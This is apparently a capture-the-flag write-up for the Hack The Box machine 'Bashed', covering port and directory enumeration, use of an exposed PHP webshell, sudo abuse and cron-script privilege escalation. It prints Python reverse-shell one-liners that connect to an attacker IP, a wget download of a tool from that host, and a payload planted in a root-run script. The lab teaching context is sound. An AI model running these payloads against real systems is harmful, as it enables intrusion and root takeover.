---
title: Bashed
date: 2025-12-12 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, bashed ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0f058b73659ca043de9f5240abd651ca.png
    alt: Hack The Box
---

> Bashed
Linux · Easy 

## Task 1

How many open TCP ports are listening on Bashed?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 1000 10.129.13.30  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 19:10 CET
Nmap scan report for 10.129.13.30
Host is up (0.049s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.64 seconds
```

> 1

## Task 2
What is the relative path on the webserver to a folder that contains phpbash.php?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ dirsearch -u http://10.129.13.30/ 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                     
                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/pmartinezr/reports/http_10.129.13.30/__25-12-12_19-21-44.txt

Target: http://10.129.13.30/

[19:21:44] Starting:                                                                                                        
[19:21:45] 301 -  309B  - /js  ->  http://10.129.13.30/js/                  
[19:21:45] 301 -  310B  - /php  ->  http://10.129.13.30/php/                
[19:21:50] 403 -  298B  - /.ht_wsr.txt                                      
[19:21:50] 403 -  301B  - /.htaccess.bak1                                   
[19:21:50] 403 -  301B  - /.htaccess.orig                                   
[19:21:50] 403 -  303B  - /.htaccess.sample
[19:21:50] 403 -  301B  - /.htaccess.save                                   
[19:21:50] 403 -  301B  - /.htaccess_orig                                   
[19:21:50] 403 -  302B  - /.htaccess_extra                                  
[19:21:50] 403 -  299B  - /.htaccess_sc
[19:21:50] 403 -  292B  - /.html                                            
[19:21:50] 403 -  300B  - /.htaccessOLD2
[19:21:50] 403 -  299B  - /.htaccessOLD
[19:21:50] 403 -  291B  - /.htm
[19:21:50] 403 -  299B  - /.htaccessBAK
[19:21:50] 403 -  301B  - /.htpasswd_test                                   
[19:21:50] 403 -  297B  - /.htpasswds
[19:21:50] 403 -  298B  - /.httr-oauth
[19:21:52] 403 -  292B  - /.php3                                            
[19:21:52] 403 -  291B  - /.php                                             
[19:21:57] 200 -    2KB - /about.html                                       
[19:22:18] 200 -    0B  - /config.php                                       
[19:22:20] 200 -    2KB - /contact.html                                     
[19:22:21] 301 -  310B  - /css  ->  http://10.129.13.30/css/                
[19:22:23] 200 -  482B  - /dev/                                             
[19:22:23] 301 -  310B  - /dev  ->  http://10.129.13.30/dev/                
[19:22:28] 301 -  312B  - /fonts  ->  http://10.129.13.30/fonts/            
[19:22:32] 301 -  313B  - /images  ->  http://10.129.13.30/images/          
[19:22:32] 200 -  515B  - /images/                                          
[19:22:35] 200 -  663B  - /js/                                              
[19:22:48] 200 -  457B  - /php/                                             
[19:23:00] 403 -  301B  - /server-status/                                   
[19:23:00] 403 -  300B  - /server-status                                    
[19:23:12] 301 -  314B  - /uploads  ->  http://10.129.13.30/uploads/        
[19:23:12] 200 -   14B  - /uploads/                                         
                                                                             
Task Completed   
```
Haciendo uso de ```dirsearch`` encuentro que el directorio que nos preguntan es **/dev**

``` shell
Index of /dev
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	phpbash.min.php	2017-12-04 12:21 	4.6K	 
[ ]	phpbash.php	2017-11-30 23:56 	8.1K	 
Apache/2.4.18 (Ubuntu) Server at 10.129.13.30 Port 80
```

> /dev

## Task 3

What user is the webserver running as on Bashed?

``` shell
www-data@bashed
:/var/www/html/dev# whoami
www-data
```

Ahora abrimos en el navegador la webshell http://10.129.13.30/dev/phpbash.php
y tenemos una shell en php con la que ejecutar comandos. 

> www-data

## Task 4

Submit the flag located in the arrexel user's home directory.

``` shell
www-data@bashed
:/home/arrexel# cat user.txt
9068cad3d262a642************
```

> 9068cad3d262a642************

## Task 5

www-data can run any command as a user without a password. What is that user's username?

``` shell
www-data@bashed
:/home/arrexel# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Ejecutando sudo podemos acceder a esta información. 

> scriptmanager

## Task 6

What folder in the system root can scriptmanager access that www-data could not?


``` shell
www-data@bashed
:/# ls -ltr

total 80
drwxr-xr-x 2 root root 4096 Feb 15 2017 srv
drwx------ 2 root root 16384 Dec 4 2017 lost+found
drwxr-xr-x 10 root root 4096 Dec 4 2017 usr
drwxr-xr-x 4 root root 4096 Dec 4 2017 media
lrwxrwxrwx 1 root root 32 Dec 4 2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
lrwxrwxrwx 1 root root 29 Dec 4 2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
drwxr-xr-x 19 root root 4096 Dec 4 2017 lib
drwxr-xr-x 2 root root 4096 Dec 4 2017 sbin
drwxr-xr-x 2 root root 4096 Dec 4 2017 opt
drwxr-xr-x 4 root root 4096 Dec 4 2017 home
drwxr-xr-x 2 root root 4096 Jun 2 2022 mnt
drwxr-xr-x 2 root root 4096 Jun 2 2022 lib64
drwxr-xr-x 2 root root 4096 Jun 2 2022 bin
drwxr-xr-x 12 root root 4096 Jun 2 2022 var
drwxr-xr-x 3 root root 4096 Jun 2 2022 boot
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 scripts
drwxr-xr-x 89 root root 4096 Jun 2 2022 etc
dr-xr-xr-x 170 root root 0 Dec 12 10:03 proc
drwxr-xr-x 19 root root 4140 Dec 12 10:04 dev
drwxr-xr-x 18 root root 520 Dec 12 10:04 run
drwx------ 3 root root 4096 Dec 12 10:04 root
dr-xr-xr-x 13 root root 0 Dec 12 10:43 sys
drwxrwxrwt 10 root root 4096 Dec 12 10:44 tmp
```

Investigando un poco el sistema aparece un directorio en la raíz del sistema /scripts

> /scripts

## Task 7

What is filename of the file that is being run by root every couple minutes?

``` shell
sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.224",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

¿Necesitas una shell reversa? [https://www.revshells.com/](https://www.revshells.com/)
En dicho sitio te agiliza el proceso y para este caso en cuestión entiendo que al ser Python 2.x podría haber alguna diferencia.
Así que en http://10.129.17.21/dev/phpbash.min.php introduzco la reverse shell en python como usuario scriptmanager.

``` shell
msf exploit(multi/handler) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python

msf exploit(multi/handler) > set lport 9001
lport => 9001

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.224:9001 
[*] Command shell session 1 opened (10.10.15.224:9001 -> 10.129.13.30:36466) at 2025-12-12 21:10:14 +0100

Shell Banner:

$ whoami
scriptmanager
$ cd /scripts
cd /scripts
$ ls
ls
test.py  test.txt
$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
 
```
Consigo meterpreter, así que como ya hice en varios retos, voy a intentar con el módulo ```local_exploit_suggester```
sin embargo no encontré ningun exploit que funcionase.

``` shell
$ wget http://10.10.15.224/pspy32s
wget http://10.10.15.224/pspy32s
--2025-12-12 13:24:53--  http://10.10.15.224/pspy32s
Connecting to 10.10.15.224:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1175648 (1.1M) [application/octet-stream]
Saving to: 'pspy32s'

pspy32s             100%[===================>]   1.12M  2.06MB/s    in 0.5s    

2025-12-12 13:24:54 (2.06 MB/s) - 'pspy32s' saved [1175648/1175648]

$ ls
ls
index.html  pspy32s  pspy64s  reverse_shell.sh  shell.py
$ chmo 777 pspy32s
chmo 777 pspy32s
sh: 505: chmo: not found
$ chmod 777 pspy32s
chmod 777 pspy32s
$ ./pspy32s
./pspy32s
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/12/12 13:25:24 CMD: UID=1001  PID=2586   | ./pspy32s 
2025/12/12 13:25:24 CMD: UID=0     PID=1979   | 
2025/12/12 13:25:24 CMD: UID=1001  PID=1887   | "/bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
                                             
```

Para seguir recabando información me hice con la herramienta [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
Esta herramienta te permite conocer la crontab sin permisos de root. 
Al pasar unos segundos se puede ver que en la crontab se ejecutan los scripts que estén en el directorio scripts. 

```"/bin/sh -c cd /scripts; for f in *.py; do python "$f"; done```

> test.py

## Submit the flag located in root's home directory.


Podríamos intentar lanzar una revershell que al ser ejecutada por el root podamos conseguir una shell con sus permisos. 

``` shell
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.224\",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
``` 
Algo como esto, si bien realmente no necesitas otra shell, para completar el reto y cuesta bastante escapar todos los carácteres especiales

``` shell
echo "from os import system" > /scripts/test.py
echo 'system("cat /root/root.txt > /tmp/flag.txt")' >> /scripts/test.py
```
Más simple es leer el archivo root.txt con python y que nos lo introduzca en un archivo flag.txt

```
$ cat flag.txt
cat flag.txt
f22e2353af9d8d************

```
> f22e2353af9d8d************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/118)